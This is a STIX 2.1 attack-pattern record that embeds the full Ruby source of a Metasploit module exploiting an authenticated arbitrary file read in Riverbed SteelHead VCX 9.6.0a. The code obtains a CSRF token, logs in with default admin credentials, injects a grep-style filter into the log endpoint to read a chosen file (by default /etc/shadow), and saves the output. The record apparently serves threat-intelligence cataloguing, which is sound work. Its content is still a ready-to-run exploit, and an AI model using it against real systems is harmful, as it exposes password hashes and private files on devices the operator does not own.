{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--18c9bb38-a448-401b-a99c-d7057a8c84a6",
    "created": "2024-08-14T16:30:15.618743Z",
    "modified": "2024-08-14T16:30:15.618747Z",
    "name": "Riverbed SteelHead VCX File Read",
    "description": " This module exploits an authenticated arbitrary file read in the log module's filter engine. SteelHead VCX (VCX255U) version 9.6.0a was confirmed as vulnerable.  'References'     => [ ['EDB', '42101'] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/riverbed_steelhead_vcx_file_read.rb",
            "external_id": "riverbed_steelhead_vcx_file_read.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Riverbed SteelHead VCX File Read',\n      'Description'    => %q{\n          This module exploits an authenticated arbitrary file read in the log module's filter engine.\n          SteelHead VCX (VCX255U) version 9.6.0a was confirmed as vulnerable.\n      },\n      'References'     =>\n        [\n          ['EDB', '42101']\n        ],\n      'Author'         =>\n        [\n          'Gregory DRAPERI <gregory.draper_at_gmail.com>', # Exploit\n          'h00die' # Module\n        ],\n      'DisclosureDate' => 'Jun 01 2017',\n      'License'        =>  MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptString.new('FILE', [ true,  'Remote file to view', '/etc/shadow']),\n        OptString.new('TARGETURI', [true, 'Vulnerable URI path', '/']),\n        OptString.new('USERNAME', [true, 'Username', 'admin']),\n        OptString.new('PASSWORD', [true, 'Password', 'password']),\n      ])\n  end\n\n  def run_host(ip)\n    # pull our csrf\n    res = send_request_cgi({\n      'uri'    => normalize_uri(datastore['TARGETURI'], 'login'),\n      'method' => 'GET',\n      'vars_get' => {\n        'next' => '/'\n      }\n    }, 25)\n\n    unless res\n      print_error(\"#{full_uri} - Connection timed out\")\n      return\n    end\n\n    cookie = res.get_cookies\n    csrf = cookie.scan(/csrftoken=(\\w+);/).flatten[0]\n    vprint_status(\"CSRF Token: #{csrf}\")\n\n    # authenticate\n    res = send_request_cgi({\n      'uri'    => normalize_uri(datastore['TARGETURI'], 'login'),\n      'method' => 'POST',\n      'cookie' => cookie,\n      'vars_post' => {\n        'csrfmiddlewaretoken' => csrf,\n        '_fields' => JSON.generate({\n          'username' => datastore['USERNAME'],\n          'password' => datastore['PASSWORD'],\n          'legalAccepted' => 'N/A',\n          'userAgent' => ''\n          })\n      }\n    }, 25)\n\n    unless res\n      print_error(\"#{full_uri} - Connection timed out\")\n      return\n    end\n\n    if res.code == 400\n      print_error('Failed Authentication')\n      return\n    elsif res.code == 200\n      vprint_good('Authenticated Successfully')\n      cookie = res.get_cookies\n      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'], proof: cookie)\n    end\n\n    # pull the file\n    res = send_request_cgi({\n      'uri'    => normalize_uri(datastore['TARGETURI'], 'modules/common/logs'),\n      'method' => 'GET',\n      'cookie' => cookie,\n      'vars_get' => {\n        'filterStr' => \"msg:-e .* #{datastore['FILE']}\"\n      }\n    }, 25)\n\n    unless res\n      print_error(\"#{full_uri} - Connection timed out\")\n      return\n    end\n\n    if res && res.body\n      result = res.get_json_document\n      unless result.has_key?('web3.model')\n        print_error('Invalid JSON returned')\n        return\n      end\n      reconstructed_file = []\n      # so the format is super icky here.  It makes a hash table for each row in the file. then the 'msg' field starts with\n      # the file name.  It also, by default, includes other files, so we need to check we're on the right file.\n      result['web3.model']['messages']['rows'].each do |row|\n        if row['msg'].start_with?(datastore['FILE'])\n          reconstructed_file << row['msg'].gsub(\"#{datastore['FILE']}:\",'').strip\n        end\n      end\n      if reconstructed_file.any?\n        reconstructed_file = reconstructed_file.join(\"\\n\")\n        vprint_good(\"File Contents:\\n#{reconstructed_file}\")\n        stored_path = store_loot('host.files', 'text/plain', rhost, reconstructed_file, datastore['FILE'])\n        print_good(\"Stored #{datastore['FILE']} to #{stored_path}\")\n      else\n        print_error(\"File not found or empty file: #{datastore['FILE']}\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "Jun 01 2017"
}